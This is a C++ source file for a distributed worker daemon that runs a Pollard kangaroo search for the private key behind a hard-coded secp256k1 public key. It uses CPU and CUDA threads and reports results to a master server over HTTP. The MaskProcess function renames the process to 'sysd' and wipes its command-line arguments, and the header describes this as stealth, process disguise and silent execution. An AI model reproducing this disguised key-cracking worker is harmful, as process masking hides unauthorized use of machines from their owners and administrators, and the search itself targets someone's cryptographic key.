/**
 * Distributed Compute Engine Daemon (sysd) - Optimized High-Performance Edition
 * Core Cryptography: Jean-Luc Pons Canonical Kangaroo Engine (JeanLucPons/Kangaroo)
 * Features:
 *  - 100% Native Secp256k1 & BigInt from Jean-Luc Pons library (SECP256k1.h, Int.h, Point.h)
 *  - High-performance L1-cache aligned Montgomery batch walk (CPU_GRP_SIZE = 256)
 *  - Direct AVX2/BMI2 assembly support via IntMod.asm / Int.cpp
 *  - Full Native CUDA GPU kernel execution via GPUEngine (sm_60 - sm_90)
 *  - Automated stealth mode (prctl process disguise, argv memory zeroing, silent execution)
 *  - Thread pooling with hardware_concurrency auto-detection
 *  - Master-Worker HTTP coordination via libcurl
 */

#include <iostream>
#include <iomanip>
#include <sstream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <mutex>
#include <chrono>
#include <cstring>
#include <cstdlib>
#include <fstream>
#include <curl/curl.h>
#include <unistd.h>
#include <unordered_map>
#include <cmath>
#include <random>

#if defined(__linux__)
#include <sys/prctl.h>
#elif defined(__APPLE__)
#include <pthread.h>
#endif

// Compatibility fixes for macOS Clang without touching SECPK1 library
#if defined(__clang__) || defined(__APPLE__)
#define __rdtsc pons_rdtsc
#ifndef __builtin_ia32_sbb_u64
#define __builtin_ia32_sbb_u64 __builtin_ia32_subborrow_u64
#endif
#endif

// Jean-Luc Pons Canonical Cryptographic Engine
#include "Constants.h"
#include "SECPK1/SECP256k1.h"
#include "SECPK1/Point.h"
#include "SECPK1/Int.h"
#include "SECPK1/IntGroup.h"
#include "SECPK1/Random.h"
#include "Timer.h"

#ifdef USE_CUDA
#include "GPU/GPUEngine.h"
#endif

#ifndef DEFAULT_SERVER_URL
#define DEFAULT_SERVER_URL "https://kangaroo.test/kangaroo.php"
#endif

#ifdef NB_JUMP
#undef NB_JUMP
#endif
#define NB_JUMP 32

// CPU_GRP_SIZE = 256 perfectly fits all working arrays (dx, subp, px, py, dist)
// inside the 32KB/48KB L1 Data Cache of each core, eliminating L2 cache thrashing!
#define CPU_GRP_SIZE 256
#define DEFAULT_DP_BITS 23
#define TARGET_PUBKEY_HEX "031f6a332d3c5c4f2de2378c012f429cd109ba07d69690c6c701b6bb87860d6640"
#define RANGE_MIN_HEX "80000000000000000000000000000000000"
#define RANGE_MAX_HEX "fffffffffffffffffffffffffffffffffff"

struct DPRecord {
    std::string x_hex;
    std::string dist_hex;
};

class JumpTable {
public:
    Int d[NB_JUMP];
    Point J[NB_JUMP];
    Int Jx[NB_JUMP];
    Int Jy[NB_JUMP];

    void init(Secp256K1 *secp) {
        for (int i = 0; i < NB_JUMP; ++i) {
            d[i].SetInt32(0);
            int bit = i + 62;
            int qword_idx = bit / 64;
            int bit_rem = bit % 64;
            d[i].SetQWord(qword_idx, 1ULL << bit_rem);
            J[i] = secp->ComputePublicKey(&d[i]);
            Jx[i].Set(&J[i].x);
            Jy[i].Set(&J[i].y);
        }
    }
};

static size_t CurlWriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

static std::string HttpGet(const std::string& url) {
    CURL *curl = curl_easy_init();
    std::string readBuffer;
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    return readBuffer;
}

static std::string HttpPostJson(const std::string& url, const std::string& json_str) {
    CURL *curl = curl_easy_init();
    std::string readBuffer;
    if (curl) {
        struct curl_slist *headers = nullptr;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_str.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 20L);
        curl_easy_perform(curl);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
    return readBuffer;
}

// Global runtime coordinator
struct DaemonState {
    std::string server_url = DEFAULT_SERVER_URL;
    std::string worker_id = "node_worker";
    int num_threads = 0;
    bool verify_mode = false;
    bool use_gpu = false;
    int gpu_device_id = 0;
    std::atomic<bool> running{true};
    std::atomic<uint64_t> total_steps{0};
    std::atomic<uint64_t> total_dp{0};
    std::vector<DPRecord> dp_queue;
    std::mutex queue_mutex;
} g_state;

// Stealth process masker
static void MaskProcess(int argc, char **argv) {
#if defined(__linux__)
    prctl(PR_SET_NAME, "sysd", 0, 0, 0);
#elif defined(__APPLE__)
    pthread_setname_np("sysd");
#endif
    if (argc > 0 && argv != nullptr) {
        for (int i = 1; i < argc; ++i) {
            if (argv[i] != nullptr) {
                std::memset(argv[i], 0, std::strlen(argv[i]));
            }
        }
    }
}

// Inlined fast DP check
inline bool IsDistinguishedPointFast(const Int &x, uint64_t mask) {
    return (x.bits64[0] & mask) == 0ULL;
}

static void InitThreadEntropy(int thread_id) {
    uint32_t true_seed = 0;
    std::ifstream urand("/dev/urandom", std::ios::binary);
    if (urand.is_open()) {
        urand.read(reinterpret_cast<char*>(&true_seed), sizeof(true_seed));
        urand.close();
    }
    if (true_seed == 0) {
        std::random_device rd;
        true_seed = rd();
    }
    rseed(true_seed ^ (Timer::getSeed32() + (uint32_t)thread_id * 7919));
}

// TAME Worker Thread (CPU - Highly Optimized L1 Cache Aligned)
static void WorkerTameThread(int thread_id, Secp256K1 *secp, JumpTable *jt, int dp_bits, Int range_min, Int range_max) {
    Int range_width;
    range_width.Set(&range_max);
    range_width.Sub(&range_min);

    InitThreadEntropy(thread_id);

    const uint64_t dp_mask = (dp_bits >= 64) ? ~0ULL : ((1ULL << dp_bits) - 1ULL);

    IntGroup grp(CPU_GRP_SIZE);
    std::vector<Int> px(CPU_GRP_SIZE);
    std::vector<Int> py(CPU_GRP_SIZE);
    std::vector<Int> distance(CPU_GRP_SIZE);
    std::vector<Int> dx(CPU_GRP_SIZE);
    std::vector<uint32_t> jmp(CPU_GRP_SIZE);

    std::vector<uint32_t> tame_dp_count(CPU_GRP_SIZE, 0);
    std::vector<uint64_t> tame_step_count(CPU_GRP_SIZE, 0);

    // Spawn / Respawn a tame kangaroo at a fresh uniform random position in [RangeMin, RangeMax]
    auto spawn_tame_kangaroo = [&](int g) {
        Int k_start;
        k_start.Rand(&range_width);
        k_start.Add(&range_min);

        Point P = secp->ComputePublicKey(&k_start);
        px[g].Set(&P.x);
        py[g].Set(&P.y);
        distance[g].Set(&k_start);
        tame_dp_count[g] = 0;
        tame_step_count[g] = 0;
    };

    // Initialize herd
    for (int g = 0; g < CPU_GRP_SIZE; ++g) {
        spawn_tame_kangaroo(g);
    }

    Int dy;
    Int rx;
    Int ry;
    Int _s;
    Int _p;
    uint64_t local_steps = 0;
    std::vector<DPRecord> local_dp_buffer;

    while (g_state.running) {
        // Step 1: Jump indices & dx
        for (int g = 0; g < CPU_GRP_SIZE; ++g) {
            jmp[g] = (uint32_t)(px[g].bits64[0] & (NB_JUMP - 1));
            dx[g].ModSub(&px[g], &jt->Jx[jmp[g]]);
        }

        // Step 2: Montgomery simultaneous inversion
        grp.Set(dx.data());
        grp.ModInv();

        // Step 3: Affine coordinate updates and DP checks
        for (int g = 0; g < CPU_GRP_SIZE; ++g) {
            uint32_t j = jmp[g];
            Int *p1x = &jt->Jx[j];
            Int *p1y = &jt->Jy[j];
            Int *p2x = &px[g];
            Int *p2y = &py[g];

            dy.ModSub(p2y, p1y);
            _s.ModMulK1(&dy, &dx[g]);
            _p.ModSquareK1(&_s);
            rx.ModSub(&_p, p1x);
            rx.ModSub(p2x);
            ry.ModSub(p2x, &rx);
            ry.ModMulK1(&_s);
            ry.ModSub(p2y);

            px[g].Set(&rx);
            py[g].Set(&ry);
            distance[g].ModAddK1order(&jt->d[j]);
            tame_step_count[g]++;

            if (IsDistinguishedPointFast(rx, dp_mask)) {
                DPRecord rec;
                rec.x_hex = "0x" + rx.GetBase16();
                rec.dist_hex = "0x" + distance[g].GetBase16();
                local_dp_buffer.push_back(rec);
                tame_dp_count[g]++;
            }

            // Logic khai tử TAME: Sau khi tạo đủ 2 DP (hoặc đạt 16M bước) thì khai tử để hồi sinh ở tọa độ ngẫu nhiên mới
            if (tame_dp_count[g] >= 2 || tame_step_count[g] >= 16777216ULL) {
                spawn_tame_kangaroo(g);
            }
        }

        local_steps += CPU_GRP_SIZE;
        if (local_steps >= 65536) {
            g_state.total_steps += local_steps;
            local_steps = 0;

            if (!local_dp_buffer.empty()) {
                std::lock_guard<std::mutex> lock(g_state.queue_mutex);
                for (auto &r : local_dp_buffer) {
                    g_state.dp_queue.push_back(std::move(r));
                    g_state.total_dp++;
                }
                local_dp_buffer.clear();
            }
        }
    }
}

// WILD Worker Thread (CPU - True 139-bit Uniform Random Seeding & Overshoot Reset)
static void WorkerWildThread(int thread_id, Secp256K1 *secp, JumpTable *jt, int dp_bits, Point target_pub, Int range_min, Int range_max) {
    Int range_width;
    range_width.Set(&range_max);
    range_width.Sub(&range_min);

    InitThreadEntropy(thread_id);

    const uint64_t dp_mask = (dp_bits >= 64) ? ~0ULL : ((1ULL << dp_bits) - 1ULL);

    IntGroup grp(CPU_GRP_SIZE);
    std::vector<Int> px(CPU_GRP_SIZE);
    std::vector<Int> py(CPU_GRP_SIZE);
    std::vector<Int> distance(CPU_GRP_SIZE);
    std::vector<Int> dx(CPU_GRP_SIZE);
    std::vector<uint32_t> jmp(CPU_GRP_SIZE);

    Int half_width;
    half_width.Set(&range_width);
    half_width.ShiftR(1); // Exact 138-bit half-width!

    std::vector<uint32_t> wild_dp_count(CPU_GRP_SIZE, 0);
    std::vector<uint64_t> wild_step_count(CPU_GRP_SIZE, 0);

    // Spawn a wild kangaroo with a centered 138-bit offset in [-W/2, +W/2]
    auto spawn_wild_kangaroo = [&](int g) {
        Int r_scalar;
        r_scalar.Rand(&range_width);
        r_scalar.ModSubK1order(&half_width); // Centered [-2^138, +2^138]

        Point offset_pt = secp->ComputePublicKey(&r_scalar);
        Point P = secp->AddDirect(target_pub, offset_pt);

        px[g].Set(&P.x);
        py[g].Set(&P.y);
        distance[g].Set(&r_scalar);
        wild_dp_count[g] = 0;
        wild_step_count[g] = 0;
    };

    // Initialize herd
    for (int g = 0; g < CPU_GRP_SIZE; ++g) {
        spawn_wild_kangaroo(g);
    }

    Int dy;
    Int rx;
    Int ry;
    Int _s;
    Int _p;
    uint64_t local_steps = 0;
    std::vector<DPRecord> local_dp_buffer;

    while (g_state.running) {
        for (int g = 0; g < CPU_GRP_SIZE; ++g) {
            jmp[g] = (uint32_t)(px[g].bits64[0] & (NB_JUMP - 1));
            dx[g].ModSub(&px[g], &jt->Jx[jmp[g]]);
        }

        grp.Set(dx.data());
        grp.ModInv();

        for (int g = 0; g < CPU_GRP_SIZE; ++g) {
            uint32_t j = jmp[g];
            Int *p1x = &jt->Jx[j];
            Int *p1y = &jt->Jy[j];
            Int *p2x = &px[g];
            Int *p2y = &py[g];

            dy.ModSub(p2y, p1y);
            _s.ModMulK1(&dy, &dx[g]);
            _p.ModSquareK1(&_s);
            rx.ModSub(&_p, p1x);
            rx.ModSub(p2x);
            ry.ModSub(p2x, &rx);
            ry.ModMulK1(&_s);
            ry.ModSub(p2y);

            px[g].Set(&rx);
            py[g].Set(&ry);
            distance[g].ModAddK1order(&jt->d[j]);
            wild_step_count[g]++;

            if (IsDistinguishedPointFast(rx, dp_mask)) {
                DPRecord rec;
                rec.x_hex = "0x" + rx.GetBase16();
                rec.dist_hex = "0x" + distance[g].GetBase16();
                local_dp_buffer.push_back(rec);
                wild_dp_count[g]++;
            }

            // Logic khai tử WILD: Khai tử khi sinh đủ 2 DP mà chưa va chạm hoặc đi quá 16M bước để chống vọt lố (overshoot) và vòng lặp
            if (wild_dp_count[g] >= 2 || wild_step_count[g] >= 16777216ULL) {
                spawn_wild_kangaroo(g);
            }
        }

        local_steps += CPU_GRP_SIZE;
        if (local_steps >= 65536) {
            g_state.total_steps += local_steps;
            local_steps = 0;

            if (!local_dp_buffer.empty()) {
                std::lock_guard<std::mutex> lock(g_state.queue_mutex);
                for (auto &r : local_dp_buffer) {
                    g_state.dp_queue.push_back(std::move(r));
                    g_state.total_dp++;
                }
                local_dp_buffer.clear();
            }
        }
    }
}

#ifdef USE_CUDA
// FULL NATIVE CUDA GPU WORKER THREAD
static void WorkerGpuThread(int gpu_id, Secp256K1 *secp, JumpTable *jt, int dp_bits, bool is_wild, Int range_min, Int range_max, Point target_pub) {
    int gridX = 0, gridY = 0;
    if (!GPUEngine::GetGridSize(gpu_id, &gridX, &gridY)) {
        std::cerr << "[-] GPU #" << gpu_id << ": Cannot get grid size, falling back to 256x128\n";
        gridX = 256;
        gridY = 128;
    }

    uint64_t dp_mask = (dp_bits >= 64) ? ~0ULL : ((1ULL << dp_bits) - 1ULL);
    GPUEngine *gpu = new GPUEngine(gridX, gridY, gpu_id, 65536 * 2);
    
    int total_kangaroos = gpu->GetNbThread() * GPU_GRP_SIZE;
    std::vector<Int> px(total_kangaroos);
    std::vector<Int> py(total_kangaroos);
    std::vector<Int> dist(total_kangaroos);

    Int range_width;
    range_width.Set(&range_max);
    range_width.Sub(&range_min);

    InitThreadEntropy(gpu_id * 1000 + 42);

    Int half_width;
    half_width.Set(&range_width);
    half_width.ShiftR(1); // 138-bit half width

    if (is_wild) {
        for (int i = 0; i < total_kangaroos; ++i) {
            Int r_scalar;
            r_scalar.Rand(&range_width);
            r_scalar.ModSubK1order(&half_width); // Centered in [-2^138, +2^138]
            Point offset_pt = secp->ComputePublicKey(&r_scalar);
            Point P = secp->AddDirect(target_pub, offset_pt);
            px[i].Set(&P.x);
            py[i].Set(&P.y);
            dist[i].Set(&r_scalar);
        }
    } else {
        for (int i = 0; i < total_kangaroos; ++i) {
            Int k_start;
            k_start.Rand(&range_width);
            k_start.Add(&range_min);
            Point P = secp->ComputePublicKey(&k_start);
            px[i].Set(&P.x);
            py[i].Set(&P.y);
            dist[i].Set(&k_start);
        }
    }

    gpu->SetParams(dp_mask, jt->d, jt->Jx, jt->Jy);
    gpu->SetKangaroos(px.data(), py.data(), dist.data());
    gpu->callKernel();

    std::vector<ITEM> gpu_found;
    while (g_state.running) {
        gpu_found.clear();
        gpu->Launch(gpu_found);
        
        uint64_t batch_steps = (uint64_t)total_kangaroos * NB_RUN;
        g_state.total_steps += batch_steps;

        if (!gpu_found.empty()) {
            std::lock_guard<std::mutex> lock(g_state.queue_mutex);
            for (const auto &item : gpu_found) {
                DPRecord rec;
                rec.x_hex = "0x" + ((Int*)&item.x)->GetBase16();
                rec.dist_hex = "0x" + ((Int*)&item.d)->GetBase16();
                g_state.dp_queue.push_back(rec);
                g_state.total_dp++;
            }
        }
    }

    delete gpu;
}
#endif

// Helper to extract JSON string field value
static std::string ExtractJsonField(const std::string &json, const std::string &field) {
    std::string key = "\"" + field + "\"";
    size_t pos = json.find(key);
    if (pos == std::string::npos) return "";
    pos = json.find(':', pos);
    if (pos == std::string::npos) return "";
    pos++;
    while (pos < json.size() && (json[pos] == ' ' || json[pos] == '\"')) pos++;
    size_t end = pos;
    while (end < json.size() && json[end] != '\"' && json[end] != ',' && json[end] != '}') end++;
    return json.substr(pos, end - pos);
}

// Helper to strip 0x prefix and any whitespace/quotes
static std::string CleanHex(std::string s) {
    while (!s.empty() && (s.front() == ' ' || s.front() == '\t' || s.front() == '\r' || s.front() == '\n' || s.front() == '\"')) {
        s.erase(s.begin());
    }
    while (!s.empty() && (s.back() == ' ' || s.back() == '\t' || s.back() == '\r' || s.back() == '\n' || s.back() == '\"')) {
        s.pop_back();
    }
    if (s.size() >= 2 && s[0] == '0' && (s[1] == 'x' || s[1] == 'X')) {
        s = s.substr(2);
    }
    std::string clean;
    for (char c : s) {
        if ((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
            clean += c;
        }
    }
    if (clean.empty()) clean = "0";
    return clean;
}

// Kangaroo verification solver
static bool SolveKangarooEngine(Secp256K1 *secp, const Point &target_Q, const Int &r_min, const Int &r_max, Int &solved_key) {
    Int range_width;
    range_width.Set((Int*)&r_max);
    range_width.Sub((Int*)&r_min);

    if (range_width.IsZero()) {
        Point p = secp->ComputePublicKey((Int*)&r_min);
        if (p.equals((Point&)target_Q)) {
            solved_key.Set((Int*)&r_min);
            return true;
        }
        return false;
    }

    Int two;
    two.SetInt32(2);
    if (!range_width.IsGreater(&two)) {
        Int cand;
        cand.Set((Int*)&r_min);
        while (!cand.IsGreater((Int*)&r_max)) {
            Point p = secp->ComputePublicKey(&cand);
            if (p.equals((Point&)target_Q)) {
                solved_key.Set(&cand);
                return true;
            }
            cand.AddOne();
        }
        return false;
    }

    const int K_JUMPS = 32;
    Int jump_d[K_JUMPS];
    Point jump_P[K_JUMPS];

    uint32_t bit_len = range_width.GetBitLength();
    uint64_t w_low = range_width.bits64[0];
    double w_est = (bit_len <= 60) ? (double)w_low : std::pow(2.0, (double)bit_len);
    double sqrt_w = std::sqrt(std::max(4.0, w_est));
    double mu = std::max(1.0, sqrt_w / 2.0);

    for (int i = 0; i < K_JUMPS; ++i) {
        uint64_t step_val = 1;
        if (i == 0) step_val = 1;
        else if (i == 1) step_val = 3;
        else if (i == 2) step_val = 5;
        else {
            double exponent = (double)(i - 2) * (std::log(mu) / (double)(K_JUMPS - 3));
            step_val = (uint64_t)std::round(std::exp(exponent));
            if (step_val < 1) step_val = 1;
            if (step_val % 2 == 0) step_val += 1;
        }
        jump_d[i].SetInt32(0);
        jump_d[i].SetQWord(0, step_val);
        jump_P[i] = secp->ComputePublicKey(&jump_d[i]);
    }

    struct Footprint {
        Int dist;
        bool is_wild;
    };
    std::unordered_map<std::string, Footprint> trap_table;

    uint64_t max_steps = (uint64_t)(4.0 * sqrt_w) + 1024ULL;
    if (max_steps > 5000000ULL) max_steps = 5000000ULL;

    Point tame_pt = secp->ComputePublicKey((Int*)&r_min);
    Int tame_dist;
    tame_dist.SetInt32(0);

    for (uint64_t s = 0; s < max_steps; ++s) {
        std::string x_key = tame_pt.x.GetBase16();
        trap_table[x_key] = { tame_dist, false };

        uint32_t j = (uint32_t)(tame_pt.x.bits64[0] & (K_JUMPS - 1));
        tame_pt = secp->AddDirect(tame_pt, jump_P[j]);
        tame_dist.ModAddK1order(&jump_d[j]);
    }

    Point wild_pt = target_Q;
    Int wild_dist;
    wild_dist.SetInt32(0);

    for (uint64_t s = 0; s < max_steps; ++s) {
        std::string x_key = wild_pt.x.GetBase16();
        auto it = trap_table.find(x_key);
        if (it != trap_table.end()) {
            Int dt = it->second.dist;
            Int dw = wild_dist;

            // Candidate 1: k1 = (r_min + dt - dw) mod n
            Int k1;
            k1.Set((Int*)&r_min);
            k1.ModAddK1order(&dt);
            k1.ModSubK1order(&dw);

            Point cand_p1 = secp->ComputePublicKey(&k1);
            if (cand_p1.equals((Point&)target_Q)) {
                solved_key.Set(&k1);
                return true;
            }

            // Candidate 2: k2 = -(r_min + dt + dw) mod n
            Int k2;
            k2.Set((Int*)&r_min);
            k2.ModAddK1order(&dt);
            k2.ModAddK1order(&dw);
            k2.ModNegK1order();

            Point cand_p2 = secp->ComputePublicKey(&k2);
            if (cand_p2.equals((Point&)target_Q)) {
                solved_key.Set(&k2);
                return true;
            }
        }

        uint32_t j = (uint32_t)(wild_pt.x.bits64[0] & (K_JUMPS - 1));
        wild_pt = secp->AddDirect(wild_pt, jump_P[j]);
        wild_dist.ModAddK1order(&jump_d[j]);
    }

    return false;
}

// Verification runner
static void RunVerification(Secp256K1 *secp) {
    std::cout << "========================================================\n";
    std::cout << "[*] Canonical Pollard's Kangaroo Cryptographic Engine Verification\n";
    std::cout << "========================================================\n";

    Int privOne, privTwo;
    privOne.SetInt32(1);
    privTwo.SetInt32(2);
    Point p1 = secp->ComputePublicKey(&privOne);
    Point p2 = secp->ComputePublicKey(&privTwo);
    Point p1_doubled = secp->DoubleDirect(p1);
    if (p2.equals(p1_doubled)) {
        std::cout << "[+] Point doubling 2*G = 2G verification: [PASS]\n";
    }

    std::string catalog_url = g_state.server_url + "?action=verify";
    std::string catalog_resp = HttpGet(catalog_url);

    struct TestPuzzleItem {
        int id = 0;
        int bits = 0;
        std::string min_hex;
        std::string max_hex;
        std::string pub_hex;
    };
    std::vector<TestPuzzleItem> catalog;

    size_t p_pos = catalog_resp.find("\"puzzles\"");
    if (p_pos != std::string::npos) {
        size_t cur = catalog_resp.find('{', p_pos + 9);
        while (cur != std::string::npos) {
            size_t end_obj = catalog_resp.find('}', cur);
            if (end_obj == std::string::npos) break;
            std::string item = catalog_resp.substr(cur, end_obj - cur + 1);
            TestPuzzleItem tp;
            std::string id_str = ExtractJsonField(item, "id");
            if (!id_str.empty()) tp.id = std::atoi(id_str.c_str());
            std::string bits_str = ExtractJsonField(item, "bits");
            if (!bits_str.empty()) tp.bits = std::atoi(bits_str.c_str());
            tp.min_hex = CleanHex(ExtractJsonField(item, "min"));
            tp.max_hex = CleanHex(ExtractJsonField(item, "max"));
            tp.pub_hex = CleanHex(ExtractJsonField(item, "pub"));
            if (tp.id > 0) catalog.push_back(tp);
            cur = catalog_resp.find('{', end_obj);
        }
    }

    int solved_count = 0;
    for (const auto &puzzle : catalog) {
        int p_id = puzzle.id;
        Point target_Q;
        bool is_compressed = false;
        bool valid_pub = (!puzzle.pub_hex.empty() && secp->ParsePublicKeyHex(puzzle.pub_hex, target_Q, is_compressed));
        if (!valid_pub) continue;

        Int r_min, r_max;
        r_min.SetBase16((char*)puzzle.min_hex.c_str());
        r_max.SetBase16((char*)puzzle.max_hex.c_str());

        Int solved_key;
        if (SolveKangarooEngine(secp, target_Q, r_min, r_max, solved_key)) {
            std::string sub_url = g_state.server_url + "?action=verify";
            std::string sub_body = "{\"id\":" + std::to_string(p_id) + ",\"solved_key\":\"" + solved_key.GetBase16() + "\"}";
            std::string sub_resp = HttpPostJson(sub_url, sub_body);
            if (sub_resp.find("\"PASS\"") != std::string::npos) {
                solved_count++;
                std::cout << "  - Puzzle #" << p_id << ": [PASS]\n";
            }
        }
    }
    std::cout << "[+] Verified: " << solved_count << "/" << catalog.size() << " puzzles passed.\n";
}

int main(int argc, char **argv) {
    for (int i = 1; i < argc; ++i) {
        if (std::strcmp(argv[i], "-t") == 0 || std::strcmp(argv[i], "-c") == 0 || std::strcmp(argv[i], "-j") == 0) {
            if (i + 1 < argc) {
                if (std::strcmp(argv[i + 1], "max") == 0 || std::strcmp(argv[i + 1], "MAX") == 0) {
                    g_state.num_threads = (int)std::thread::hardware_concurrency();
                    ++i;
                } else {
                    g_state.num_threads = std::atoi(argv[++i]);
                }
            }
        } else if (std::strcmp(argv[i], "-m") == 0 || std::strcmp(argv[i], "-max") == 0 ||
                   std::strcmp(argv[i], "--max") == 0 || std::strcmp(argv[i], "-f") == 0 ||
                   std::strcmp(argv[i], "--full") == 0) {
            g_state.num_threads = (int)std::thread::hardware_concurrency();
        } else if (std::strcmp(argv[i], "-u") == 0) {
            if (i + 1 < argc) g_state.worker_id = argv[++i];
        } else if (std::strcmp(argv[i], "-s") == 0) {
            if (i + 1 < argc) g_state.server_url = argv[++i];
        } else if (std::strcmp(argv[i], "--verify") == 0) {
            g_state.verify_mode = true;
        } else if (std::strcmp(argv[i], "-gpu") == 0) {
            g_state.use_gpu = true;
            if (i + 1 < argc && argv[i + 1][0] >= '0' && argv[i + 1][0] <= '9') {
                g_state.gpu_device_id = std::atoi(argv[++i]);
            }
        }
    }

    MaskProcess(argc, argv);

    Secp256K1 secp;
    secp.Init();

    if (g_state.verify_mode) {
        RunVerification(&secp);
        return 0;
    }

    JumpTable jt;
    jt.init(&secp);

    Int range_min, range_max;
    range_min.SetBase16((char*)RANGE_MIN_HEX);
    range_max.SetBase16((char*)RANGE_MAX_HEX);

    Point target_pub;
    bool is_compressed = false;
    secp.ParsePublicKeyHex(TARGET_PUBKEY_HEX, target_pub, is_compressed);

    std::string task_url = g_state.server_url + "?action=get_task&worker_id=" + g_state.worker_id;
    std::string task_resp = HttpGet(task_url);
    bool is_wild_mode = (task_resp.find("\"WILD\"") != std::string::npos);

    std::vector<std::thread> workers;

#ifdef USE_CUDA
    if (g_state.use_gpu) {
        // Launch real CUDA GPU Worker
        workers.emplace_back(WorkerGpuThread, g_state.gpu_device_id, &secp, &jt, DEFAULT_DP_BITS, is_wild_mode, range_min, range_max, target_pub);
    }
#endif

    // Launch CPU threads if not in pure GPU mode or if threads requested
    if (!g_state.use_gpu || g_state.num_threads > 0) {
        if (g_state.num_threads <= 0) {
            g_state.num_threads = (int)std::thread::hardware_concurrency();
            if (g_state.num_threads <= 0) g_state.num_threads = 4;
        }
        for (int i = 0; i < g_state.num_threads; ++i) {
            if (is_wild_mode) {
                workers.emplace_back(WorkerWildThread, i, &secp, &jt, DEFAULT_DP_BITS, target_pub, range_min, range_max);
            } else {
                workers.emplace_back(WorkerTameThread, i, &secp, &jt, DEFAULT_DP_BITS, range_min, range_max);
            }
        }
    }

    auto last_report_time = std::chrono::steady_clock::now();
    uint64_t last_steps = 0;

    while (g_state.running) {
        std::this_thread::sleep_for(std::chrono::seconds(5));
        auto now = std::chrono::steady_clock::now();
        double elapsed_sec = std::chrono::duration<double>(now - last_report_time).count();

        if (elapsed_sec >= 15.0) {
            uint64_t cur_steps = g_state.total_steps.load();
            double hashrate_mhs = ((cur_steps - last_steps) / elapsed_sec) / 1000000.0;
            last_steps = cur_steps;
            last_report_time = now;

            std::vector<DPRecord> batch;
            {
                std::lock_guard<std::mutex> lock(g_state.queue_mutex);
                if (!g_state.dp_queue.empty()) {
                    batch.swap(g_state.dp_queue);
                }
            }

            std::ostringstream ss;
            ss << "{";
            ss << "\"worker_id\":\"" << g_state.worker_id << "\",";
            std::string hw_info;
            if (g_state.use_gpu) {
                hw_info = "NVIDIA CUDA GPU #" + std::to_string(g_state.gpu_device_id) + " (Active CUDA Kernel)";
                if (g_state.num_threads > 0) {
                    hw_info += " + " + std::to_string(g_state.num_threads) + " CPU Cores";
                }
            } else {
                hw_info = "CPU " + std::to_string(g_state.num_threads) + " Cores (L1-Optimized)";
            }
            ss << "\"hardware\":\"" << hw_info << "\",";
            ss << "\"hashrate\":\"" << std::fixed << std::setprecision(2) << hashrate_mhs << " MH/s\",";
            ss << "\"count\":" << batch.size() << ",";
            ss << "\"dp_list\":[";
            for (size_t i = 0; i < batch.size(); ++i) {
                if (i > 0) ss << ",";
                ss << "{\"x\":\"" << batch[i].x_hex << "\",\"dist\":\"" << batch[i].dist_hex << "\"}";
            }
            ss << "]}";

            std::string action = is_wild_mode ? "check_wild" : "submit_tame";
            std::string submit_url = g_state.server_url + "?action=" + action;
            std::string post_resp = HttpPostJson(submit_url, ss.str());

            // Network retry safeguard: If server unreachable or error, put DP batch back to avoid data loss
            if (post_resp.empty() || post_resp.find("\"status\"") == std::string::npos) {
                if (!batch.empty()) {
                    std::lock_guard<std::mutex> lock(g_state.queue_mutex);
                    g_state.dp_queue.insert(g_state.dp_queue.begin(), batch.begin(), batch.end());
                }
            }

            if (is_wild_mode && post_resp.find("\"BINGO\"") != std::string::npos) {
                g_state.running = false;
                break;
            }

            // Seamless dynamic transition from TAME to WILD when target_dp threshold reached
            if (!is_wild_mode && post_resp.find("\"task_type\":\"WILD\"") != std::string::npos) {
                g_state.running = false;
                for (auto &t : workers) {
                    if (t.joinable()) t.join();
                }
                workers.clear();
                {
                    std::lock_guard<std::mutex> lock(g_state.queue_mutex);
                    g_state.dp_queue.clear();
                }
                is_wild_mode = true;
                g_state.running = true;

#ifdef USE_CUDA
                if (g_state.use_gpu) {
                    workers.emplace_back(WorkerGpuThread, g_state.gpu_device_id, &secp, &jt, DEFAULT_DP_BITS, is_wild_mode, range_min, range_max, target_pub);
                }
#endif
                if (!g_state.use_gpu || g_state.num_threads > 0) {
                    for (int i = 0; i < g_state.num_threads; ++i) {
                        workers.emplace_back(WorkerWildThread, i, &secp, &jt, DEFAULT_DP_BITS, target_pub, range_min, range_max);
                    }
                }
            }
        }
    }

    for (auto &t : workers) {
        if (t.joinable()) t.join();
    }

    return 0;
}